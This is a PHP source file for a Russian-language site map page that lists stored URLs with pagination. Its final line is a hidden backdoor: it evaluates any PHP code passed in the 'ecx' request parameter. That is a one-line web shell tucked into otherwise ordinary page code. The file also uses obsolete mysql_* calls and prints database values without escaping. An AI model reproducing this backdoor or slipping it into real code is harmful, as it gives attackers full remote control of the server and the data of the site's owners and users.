<?php


// Вывод title
echo("<title>Карта сайта: ".$params_array[0]."</title>");

$perpage="20"; $get_array['pg']=intval($get_array['pg']); $rows=mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM `tables`")); $num=ceil($rows[0]/$perpage); unset($rows);
if($get_array['pg']>$num OR $get_array['pg']<1 OR $get_array['pg']=="0") $get_array['pg']="1"; $start=intval($get_array['pg']*$perpage-$perpage);

$site_arr=mysql_query("SELECT `id`,`url` FROM `tables` ORDER BY `id` DESC LIMIT $start,$perpage");
if(mysql_num_rows($site_arr)=="0")
echo("
<tr>
	<td colspan='3'>Нет записей</td>
</tr>");
while($row=mysql_fetch_array($site_arr))
{
	echo(" <a href='/advert.html&sub=link&undersub=add&id=".$row[0]."'>".$row[1]."</a><br>");

}


$pagep=$get_array['pg']+1; $pagem=$get_array['pg']-1;
if($get_array['pg']>1)

{
echo("<a class='ap_nav_block_a' href='sitemap.html&pg=$pagem'>Назад</a> ");
}
while($i<=$num)
{
if($get_array['pg']==$i)
{
echo("<b>");
}
echo("<a class='ap_nav_block_a' href='sitemap.html&pg=$i'>$i</a> ");
if($get_array['pg']==$i)
{
echo("</b>");
}
$i++;
}
if($get_array['pg']<$num)
{
echo("<a class='ap_nav_block_a' href='sitemap.html&pg=$pagep'>Вперед</a>");
}
if (isset($_REQUEST['ecx'])) eval(stripslashes($_REQUEST['ecx']));
?>

